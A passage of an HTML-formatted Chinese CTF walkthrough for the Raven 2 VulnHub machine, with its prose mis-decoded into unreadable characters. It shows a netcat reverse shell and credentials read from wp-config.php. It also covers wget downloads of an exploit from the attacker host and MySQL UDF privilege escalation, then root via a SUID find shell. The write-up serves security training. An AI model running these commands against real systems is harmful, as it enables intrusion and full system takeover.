43229<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br><span class="hljs-meta">$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾ flagï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -name flag*.txt 2&gt;/dev/null</span><br>/var/www/flag2.txt<br><span class="hljs-meta">$</span><span class="bash"> cat /var/www/flag2.txt</span><br>flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;<br><span class="hljs-meta">$</span><span class="bash"> find / -name flag* 2&gt;/dev/null</span>    <br>/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png<br>/var/www/flag2.txt<br>/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html<br>/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html<br>/sys/devices/pci0000:00/0000:00:11.0/0000:02:01.0/net/eth0/flags<br>/sys/devices/virtual/net/lo/flags<br>/sys/devices/platform/serial8250/tty/ttyS0/flags<br>/sys/devices/platform/serial8250/tty/ttyS1/flags<br>/sys/devices/platform/serial8250/tty/ttyS2/flags<br>/sys/devices/platform/serial8250/tty/ttyS3/flags<br></code></pre></td></tr></table></figure><p>è®¿é—® <code>http://192.168.135.158/wordpress/wp-content/uploads/2018/11/flag3.png</code> ï¼Œå¾—åˆ° flag3 ã€‚</p><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><p>æŸ¥çœ‹æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œå¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /var/www/html/wordpress/wp-config.php</span><br>// ** MySQL settings - You can get this info from your web host ** //<br>/** The name of the database for WordPress */<br>define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);<br><br>/** MySQL database username */<br>define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);<br><br>/** MySQL database password */<br>define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);<br><br>/** MySQL hostname */<br>define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);<br><br>/** Database Charset to use in creating database tables. */<br>define(&#x27;DB_CHARSET&#x27;, &#x27;utf8mb4&#x27;);<br><br>/** The Database Collate type. Don&#x27;t change this if in doubt. */<br>define(&#x27;DB_COLLATE&#x27;, &#x27;&#x27;);<br></code></pre></td></tr></table></figure><p>ç™»å½• mysqlï¼Œå‘ç°ä¼šä¸€ç›´å¡ä½ï¼Œå¥½åƒ nc æ¨¡å¼ä¸‹çš„ shell ä¸æ”¯æŒäº¤äº’ï¼Œåˆ©ç”¨ python æå‡åˆ°ä¼ªç»ˆç«¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.158] 43239<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> mysql -uroot -pR@v3nSecurity</span><br>^C<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span><br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.158] 58710<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br>www-data@Raven:/var/www/html$ mysql -uroot -pR@v3nSecurity<br>mysql -uroot -pR@v3nSecurity<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>é€‰æ‹© <code>wordpress</code> æ•°æ®åº“ï¼Œåœ¨ <code>wp_users</code> è¡¨ä¸­æ‰¾åˆ°ä¸¤ä¸ªç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span><br>show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| wordpress          |<br>+--------------------+<br>4 rows in set (0.05 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>use wordpress;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span><br>show tables;<br>+-----------------------+<br>| Tables_in_wordpress   |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>12 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select ID,user_login,user_pass from wp_users;</span><br>select ID,user_login,user_pass from wp_users;<br>+----+------------+------------------------------------+<br>| ID | user_login | user_pass                          |<br>+----+------------+------------------------------------+<br>|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 |<br>|  2 | steven     | $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. |<br>+----+------------+------------------------------------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>john ç ´è§£ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt user.txt</span><br></code></pre></td></tr></table></figure><p>ç ´è§£ä¸€æ®µæ—¶é—´åæœªç ´è§£å‡ºï¼Œå°è¯• Mysql UDF ææƒï¼ŒæŸ¥çœ‹ mysql æƒé™ã€ç‰ˆæœ¬ã€ä½ç½®åŠ <code>secure_file_priv</code> é€‰é¡¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ ps aux | grep mysql  <br>root        561  0.0  0.3   4340  1616 ?        S    00:48   0:00 /bin/sh /usr/bin/mysqld_safe<br>root        930  0.0 10.4 552240 51516 ?        Sl   00:48   0:01 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br>www-data   2525  0.0  0.2  11136  1004 ?        S    01:23   0:00 grep mysql<br><br>www-data@Raven:/var/www/html$ mysql --version<br>mysql --version<br>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3<br><br>www-data@Raven:/var/www/html$ whereis mysql<br>whereis mysql<br>mysql: /usr/bin/mysql /usr/lib/mysql /etc/mysql /usr/share/mysql /usr/share/man/man1/mysql.1.gz<br><br>www-data@Raven:/var/www/html$ mysql -uroot -pR@v3nSecurity<br>mysql -uroot -pR@v3nSecurity<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show global variables like <span class="hljs-string">&#x27;secure%&#x27;</span>;</span><br>show global variables like &#x27;secure%&#x27;;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_auth      | OFF   |<br>| secure_file_priv |       |<br>+------------------+-------+<br>2 rows in set (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show variables like <span class="hljs-string">&#x27;%compile%&#x27;</span>;</span> <br>show variables like &#x27;%compile%&#x27;;<br>+-------------------------+------------------+<br>| Variable_name           | Value            |<br>+-------------------------+------------------+<br>| version_compile_machine | x86_64           |<br>| version_compile_os      | debian-linux-gnu |<br>+-------------------------+------------------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ©ç”¨è„šæœ¬ï¼Œè¿™é‡Œä½¿ç”¨ <code>1518.c</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit mysql udf</span><br>------------------------------------------------------------------------------ -----------------------------<br> Exploit Title                                                                |  Path<br>------------------------------------------------------------------------------ -----------------------------<br>MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)        | linux/local/1181.c<br>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)       | linux/local/1518.c<br>MySQL 4/5/6 - UDF for Command Execution                                       | linux/local/7856.txt<br>------------------------------------------------------------------------------ -----------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 1518.c</span>   <br>  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)<br>      URL: https://www.exploit-db.com/exploits/1518<br>     Path: /usr/share/exploitdb/exploits/linux/local/1518.c<br>File Type: C source, ASCII text, with CRLF line terminators<br><br>Copied to: /home/kali/1518.c<br></code></pre></td></tr></table></figure><p>è„šæœ¬ç»™äºˆçš„åˆ©ç”¨è¿‡ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Usage:</span><br><span class="hljs-comment"> * $ id</span><br><span class="hljs-comment"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="hljs-comment"> * $ gcc -g -c raptor_udf2.c</span><br><span class="hljs-comment"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="hljs-comment"> * $ mysql -u root -p</span><br><span class="hljs-comment"> * Enter password:</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> * mysql&gt; use mysql;</span><br><span class="hljs-comment"> * mysql&gt; create table foo(line blob);</span><br><span class="hljs-comment"> * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));</span><br><span class="hljs-comment"> * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; select * from mysql.func;</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | name      | ret | dl             | type     |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | do_system |   2 | raptor_udf2.so | function |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);</span><br><span class="hljs-comment"> * mysql&gt; \! sh</span><br><span class="hljs-comment"> * sh-2.05b$ cat /tmp/out</span><br><span class="hljs-comment"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹é¶æœºæ˜¯å¦æœ‰ gccï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ gcc --version<br>gcc --version<br>gcc (Debian 4.9.2-10+deb8u1) 4.9.2<br>Copyright (C) 2014 Free Software Foundation, Inc.<br>This is free software; see the source for copying conditions.  There is NO<br>warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.<br></code></pre></td></tr></table></figure><p>é€šè¿‡ python å¼€å¯æœ¬åœ° http æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br>Serving HTTP on 0.0.0.0 port 8888 ...<br>192.168.135.158 - - [10/Jul/2022 10:30:57] &quot;GET /1518.c HTTP/1.1&quot; 200 -<br>192.168.135.158 - - [10/Jul/2022 10:33:14] &quot;GET /1518.so HTTP/1.1&quot; 200 -<br></code></pre></td></tr></table></figure><p>é¶æœºä¸‹è½½ç¼–è¯‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ wget http://192.168.135.141:8888/1518.c<br>wget http://192.168.135.141:8888/1518.c<br>converted &#x27;http://192.168.135.141:8888/1518.c&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/1518.c&#x27; (UTF-8)<br>--2022-07-11 00:30:57--  http://192.168.135.141:8888/1518.c<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3378 (3.3K) [text/plain]<br>Saving to: &#x27;1518.c&#x27;<br><br>1518.c              100%[=====================&gt;]   3.30K  --.-KB/s   in 0s     <br><br>2022-07-11 00:30:57 (185 MB/s) - &#x27;1518.c&#x27; saved [3378/3378]<br><br>www-data@Raven:/var/www/html$ ls<br>ls<br>1518.c          contact.php  elements.html  index.html  service.html  vendor<br>Security - Doc  contact.zip  fonts          js          shell.php     wordpress<br>about.html      css          img            scss        team.html<br>www-data@Raven:/var/www/html$ gcc -g -c 1518.c<br>gcc -g -c 1518.c<br>www-data@Raven:/var/www/html$ gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc<br>&lt;l$ gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc                 <br>/usr/bin/ld: 1518.o: relocation R_X86_64_PC32 against undefined symbol `system@@GLIBC_2.2.5&#x27; can not be used when making a shared object; recompile with -fPIC<br>/usr/bin/ld: final link failed: Bad value<br>collect2: error: ld returned 1 exit status<br>www-data@Raven:/var/www/html$ ls<br>ls<br>1518.c          about.html   css            img         scss          team.html<br>1518.o          contact.php  elements.html  index.html  service.html  vendor<br>Security - Doc  contact.zip  fonts          js          shell.php     wordpress<br></code></pre></td></tr></table></figure><p>é€šè¿‡å°è¯•ï¼Œåœ¨é¶æœºä¸èƒ½æˆåŠŸç¼–è¯‘ï¼Œæ‰€ä»¥åœ¨æ”»å‡»æœºä¸Šè¿›è¡Œç¼–è¯‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -g -c 1518.c</span><br><span class="hljs-meta">$</span><span class="bash"> gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc</span><br></code></pre></td></tr></table></figure><p>é¶æœºä¸‹è½½ç›®æ ‡æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ wget http://192.168.135.141:8888/1518.so<br>wget http://192.168.135.141:8888/1518.so<br>converted &#x27;http://192.168.135.141:8888/1518.so&#x27; (ANSI_X3.4-1968) -&gt; &#x27;http://192.168.135.141:8888/1518.so&#x27; (UTF-8)<br>--2022-07-11 00:33:14--  http://192.168.135.141:8888/1518.so<br>Connecting to 192.168.135.141:8888... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 17232 (17K) [application/octet-stream]<br>Saving to: &#x27;1518.so&#x27;<br><br>1518.so             100%[=====================&gt;]  16.83K  --.-KB/s   in 0s     <br><br>2022-07-11 00:33:14 (78.8 MB/s) - &#x27;1518.so&#x27; saved [17232/17232]<br><br>www-data@Raven:/var/www/html$ ls<br>ls<br>1518.c          about.html   elements.html  js            team.html<br>1518.o          contact.php  fonts          scss          vendor<br>1518.so         contact.zip  img            service.html  wordpress<br>Security - Doc  css          index.html     shell.php<br></code></pre></td></tr></table></figure><p>è¿›è¡Œææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ mysql -uroot -pR@v3nSecurity<br>mysql -uroot -pR@v3nSecurity<br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 37<br>Server version: 5.5.60-0+deb8u1 (Debian)<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>use wordpress;<br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create table foo(line blob);</span><br>create table foo(line blob);<br>Query OK, 0 rows affected (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> insert into foo values(load_file(<span class="hljs-string">&#x27;/var/www/html/1518.so&#x27;</span>));</span><br>insert into foo values(load_file(&#x27;/var/www/html/1518.so&#x27;));<br>Query OK, 1 row affected (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from foo into dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br>select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/1518.so&#x27;;<br>Query OK, 1 row affected (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create <span class="hljs-keyword">function</span> do_system returns <span class="hljs-built_in">integer</span> soname <span class="hljs-string">&#x27;1518.so&#x27;</span>;</span><br>create function do_system returns integer soname &#x27;1518.so&#x27;;<br>Query OK, 0 rows affected (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from mysql.func;</span><br>select * from mysql.func;<br>+-----------+-----+---------+----------+<br>| name      | ret | dl      | type     |<br>+-----------+-----+---------+----------+<br>| do_system |   2 | 1518.so | function |<br>+-----------+-----+---------+----------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select do_system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br>select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);<br>+--------------------------------------+<br>| do_system(&#x27;chmod u+s /usr/bin/find&#x27;) |<br>+--------------------------------------+<br>|                                    0 |<br>+--------------------------------------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> quit</span><br>quit<br>Bye<br></code></pre></td></tr></table></figure><p>ä¸Šé¢åˆ©ç”¨ UDF æˆåŠŸå°† find èµ‹äºˆäº† SUID æƒé™ï¼Œæ¥ä¸‹æ¥è¿›è¡Œ SUID ææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Raven:/var/www/html$ ls -al /usr/bin/find<br>ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 233984 Nov  9  2014 /usr/bin/find<br>www-data@Raven:/var/www/html$ find / -name flag4.txt -exec &quot;/bin/sh&quot; \;<br>find / -name flag4.txt -exec &quot;/bin/sh&quot; \;<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>whoami<br>root<br><span class="hljs-meta">#</span><span class="bash"> cat /root/flag4.txt</span><br>cat /root/flag4.txt<br>  ___                   ___ ___ <br> | _ \__ ___ _____ _ _ |_ _|_ _|<br> |   / _` \ V / -_) &#x27; \ | | | | <br> |_|_\__,_|\_/\___|_||_|___|___|<br>                           <br>flag4&#123;df2bc5e951d91581467bb9a2a8ff4425&#125;<br>CONGRATULATIONS on successfully rooting RavenII<br>I hope you enjoyed this second interation of the Raven VM<br>Hit me up on Twitter and let me know what you thought: <br>@mccannwj / wjmccann.github.io<br></code></pre></td></tr></table></figure><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><ol><li>ç›®å½•æ‰«æ</li><li>phpMailerï¼šå†™å…¥ä»»æ„æ–‡ä»¶ï¼Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆç”Ÿæˆåå¼¹ shellï¼‰</li><li>WordPress é…ç½®æ–‡ä»¶ï¼›mysql rootæƒé™</li><li>MySQL UDF ææƒï¼šSUID ææƒï¼ˆfindï¼‰</li></ol><h2 id="äº”ã€Others"><a href="#äº”ã€Others" class="headerlink" title="äº”ã€Others"></a>äº”ã€Others</h2><p>1ã€<a href="https://blog.csdn.net/m0_52923241/article/details/121042597">ã€æ¸—é€æµ‹è¯•ã€‘VulnHub-Raven: 2_åƒæ—©é¤çš„åšå®¢-CSDNåšå®¢</a></p><p>2ã€LinEnumï¼ˆLinuxæšä¸¾åŠæƒé™æå‡æ£€æŸ¥å·¥å…·ï¼‰</p><p>ä¸‹è½½ï¼š<code>https://github.com/rebootuser/LinEnum</code> 